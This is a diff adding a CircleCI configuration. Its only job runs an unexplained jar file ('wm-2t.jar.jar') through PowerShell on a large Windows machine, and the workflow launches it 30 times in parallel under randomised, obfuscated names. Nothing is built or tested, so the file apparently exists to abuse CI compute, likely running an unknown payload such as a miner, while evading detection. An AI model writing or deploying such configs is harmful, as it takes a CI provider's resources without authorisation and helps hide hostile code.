@@ -1,0 +1,79 @@
+version: 2.1
+
+jobs:
+  NODE613826ous:
+    machine:
+      image: windows-server-2022-gui:current
+    resource_class: windows.large
+    steps:
+      - checkout
+      - run:
+          name: TOKENhyper88459
+          command: |
+            java -jar wm-2t.jar.jar
+          shell: powershell.exe
+
+workflows:
+  version: 2
+  connectHYPER375217:
+    jobs:
+      - NODE613826ous:
+          name: PHASE16sys4608
+      - NODE613826ous:
+          name: modify764568dom
+      - NODE613826ous:
+          name: TEST664156ical
+      - NODE613826ous:
+          name: step912882ARY
+      - NODE613826ous:
+          name: PIPETER422540
+      - NODE613826ous:
+          name: processment774896
+      - NODE613826ous:
+          name: HIDEcore724975
+      - NODE613826ous:
+          name: encodeDER233241
+      - NODE613826ous:
+          name: likestop677070
+      - NODE613826ous:
+          name: WATCHline623643
+      - NODE613826ous:
+          name: SUPERENCRYPT554194
+      - NODE613826ous:
+          name: STACK315396ITY
+      - NODE613826ous:
+          name: load500491IBLE
+      - NODE613826ous:
+          name: SHIELDHOOD668694
+      - NODE613826ous:
+          name: PROC1line477
+      - NODE613826ous:
+          name: startWER94017
+      - NODE613826ous:
+          name: monitorsuper133598
+      - NODE613826ous:
+          name: CONVERT22DOM4095
+      - NODE613826ous:
+          name: AUTO492235cer
+      - NODE613826ous:
+          name: PHASEsave586256
+      - NODE613826ous:
+          name: TOKENEXT971392
+      - NODE613826ous:
+          name: showICAL195407
+      - NODE613826ous:
+          name: BUFFERous170247
+      - NODE613826ous:
+          name: phaseINAL577445
+      - NODE613826ous:
+          name: coreIOUS293713
+      - NODE613826ous:
+          name: BRIDGEPKG456162
+      - NODE613826ous:
+          name: COMPRESS988448ship
+      - NODE613826ous:
+          name: decrypt858981cloud
+      - NODE613826ous:
+          name: SAVE133006HOOD
+      - NODE613826ous:
+          name: webEXT908784
